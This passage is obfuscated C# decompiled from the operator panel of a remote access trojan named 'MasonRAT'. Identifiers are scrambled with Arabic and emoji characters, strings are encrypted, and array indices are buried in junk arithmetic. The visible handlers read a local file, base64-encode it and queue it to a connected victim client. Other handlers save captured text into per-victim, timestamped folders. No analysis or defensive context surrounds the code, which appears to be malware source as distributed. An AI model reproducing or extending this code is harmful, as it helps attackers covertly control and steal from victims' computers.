  internal virtual Guna2ContextMenuStrip \u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ToolStripMenuItem3")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۡم\u060A\u060Dۡڟﻋټڙڇــڙ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ToolStripMenuItem2")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608ټۙٻ\u060Cـڙـڙ\u060Dـ\u060E { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ToolStripMenuItem1")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cْ̍ڟ\u0609\u060B\u060C\u060Eـ\u0609طٺئ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  private void \u2694️MasonRAT\u270Cـ\u0608\u060Aټـ\u060E\u0609\u060A؁ټؤا\u060Aد\u060F(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cۧ\u060A\u060E\u060B\u0608ـڇ̍\u0608ٻ\u0608ۚ\u060Aط();
  }

  public void \u2694️MasonRAT\u270Cۧ\u060A\u060E\u060B\u0608ـڇ̍\u0608ٻ\u0608ۚ\u060Aط()
  {
    byte[] B_;
    try
    {
      this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.Clear();
      B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2285) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2286))));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
      return;
    }
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270C\u060D\u060Cڝدڙـﯧگـح\u060Aدٻـﻼ\u060Cؤـۧﻻ, B_);
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270C̍ـٸٽؤٽ̍\u060F\u060A\u0608ڝٺ\u060Bٺۚ(object sender, EventArgs e)
  {
    try
    {
      if (this.\u2694️MasonRAT\u270C\u060D\u060Cڝدڙـﯧگـح\u060Aدٻـﻼ\u060Cؤـۧﻻ.\u2694️MasonRAT\u270C\u060A\u060A\u060Bﯧڙﻻ\u0608ؤ\u0608\u060A)
        return;
      this.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609\u060Aؤـ\u0609\u0609حڛـۭــ\u060A\u060Aـ\u060A(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cۧ\u060A\u060E\u060B\u0608ـڇ̍\u0608ٻ\u0608ۚ\u060Aط();
  }

  private void \u2694️MasonRAT\u270Cـڝ\u0608\u060Dـﻋ\u0608ۙ\u0608\u060A\u0609ﻋ(
    object sender,
    EventArgs e)
  {
    try
    {
      Clipboard.SetText(this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.SelectedText);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cڦـﻻگ؁ــ\u0608ﻼــڅ\u0609\u0608ـ\u060Bٺ(
    object sender,
    EventArgs e)
  {
    try
    {
      if (Operators.CompareString(this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.Text, (string) null, false) == 0)
        return;
      if (!Directory.Exists(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2287)))
        Directory.CreateDirectory(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2288));
      if (!Directory.Exists(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2289) + this.\u2694️MasonRAT\u270C\u060Fـڙ\u060Bۜةڇدۡڙ̍ـ\u060Bـؤ\u060C\u0609ـٺ))
        Directory.CreateDirectory(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2290) + this.\u2694️MasonRAT\u270C\u060Fـڙ\u060Bۜةڇدۡڙ̍ـ\u060Bـؤ\u060C\u0609ـٺ);
      if (!Directory.Exists(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2291) + this.\u2694️MasonRAT\u270C\u060Fـڙ\u060Bۜةڇدۡڙ̍ـ\u060Bـؤ\u060C\u0609ـٺ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2292)))
        Directory.CreateDirectory(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2293) + this.\u2694️MasonRAT\u270C\u060Fـڙ\u060Bۜةڇدۡڙ̍ـ\u060Bـؤ\u060C\u0609ـٺ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2294));
      string[] strArray = new string[(1762126821 - (524466758 << 87614122) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0 > 1906425695 - 1264017988 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0 ? (3 ^ 5) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) : 1992424404 + -1992424396 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0];
      strArray[0] = Application.StartupPath;
      strArray[1] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2295);
      strArray[(323047878 + (1728300369 >> 2006425791) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) - (569729799 - 246681923 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0] = this.\u2694️MasonRAT\u270C\u060Fـڙ\u060Bۜةڇدۡڙ̍ـ\u060Bـؤ\u060C\u0609ـٺ;
      strArray[(493270700 - 1781768381 % 1648552148 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) + ((529577781 - (1013394395 >> 869326024) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) << ((2090768869 ^ 271539936 << 553725062) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2296);
      strArray[((2137767854 ^ (1735102604 | 962637612)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0 ^ (1957379249 << 33073990) - 718220346 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0] = DateAndTime.Now.ToString(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2297));
      strArray[((-1248319955 ^ 753415868 >> 1136671417) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) - -((1595816006 | 506218448) - 349611532 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2298);
      StreamWriter streamWriter = new StreamWriter(string.Concat(strArray), false);
      streamWriter.WriteLine(this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ.Text);
      streamWriter.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }
}
